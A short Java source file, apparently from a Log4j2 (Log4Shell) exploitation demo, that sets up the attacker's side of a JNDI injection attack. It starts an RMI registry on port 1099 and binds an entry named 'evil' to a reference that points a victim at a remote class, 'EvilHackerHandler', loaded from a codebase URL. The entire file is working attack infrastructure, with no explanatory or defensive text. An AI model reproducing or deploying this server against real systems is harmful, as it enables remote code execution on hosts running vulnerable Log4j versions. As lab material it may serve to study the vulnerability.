package com.example.logging.log4j2.cv2.hacker;
import com.sun.jndi.rmi.registry.ReferenceWrapper;

import javax.naming.Reference;
import  java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class HackerApp {

    public static void main(String[] args) throws Exception{
        LocateRegistry.createRegistry(1099);
        Registry registry = LocateRegistry.getRegistry();

        System.out.println("create hacker rmi service on 1099.");
        Reference reference = new Reference("com.example.logging.log4j2.cv2.hacker.EvilHackerHandler",
                "com.example.logging.log4j2.cv2.hacker.EvilHackerHandler","http://localhost:8080/hello");
        ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);
        registry.bind("evil",referenceWrapper);
    }
}
